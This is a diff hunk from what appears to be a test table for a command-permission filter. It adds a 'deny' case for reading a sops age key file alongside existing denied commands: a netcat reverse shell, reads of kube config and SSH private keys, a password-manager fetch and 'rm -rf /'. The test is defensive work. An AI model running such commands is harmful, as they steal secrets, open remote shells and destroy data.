@@ -61,6 +61,7 @@ CASES = [
     ("git push", "deny"),
     ("nc -e /bin/sh 1.2.3.4 4444", "deny"),
     ("cat ~/.kube/config", "deny"),
+    ("cat ~/.config/sops/age/keys.txt", "deny"),
     ("bw get password foo", "deny"),
     ("cd ~/.ssh && cat id_rsa", "deny"),
     ("rm -rf /", "deny"),
